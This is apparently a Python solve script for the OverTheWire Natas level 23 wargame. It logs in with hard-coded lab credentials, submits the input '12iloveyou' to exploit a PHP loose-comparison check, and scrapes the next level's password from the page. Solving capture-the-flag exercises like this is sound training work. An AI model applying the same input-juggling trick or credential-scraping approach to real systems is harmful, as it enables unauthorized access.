from pwn import *
import requests
import re
import codecs       #This is just to decode a string to hex

username = "natas23"
password = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"
url = "http://{}.natas.labs.overthewire.org".format(username)


log.progress("Getting the natas24 password, Hold on! ")
session = requests.session()

web = session.post(url , data= {"passwd" : "12iloveyou"}, auth = (username, password)).text
flag = re.findall("natas24 Password: (.*)</pre>", web)
print("The password for natas24 is === " + flag[0])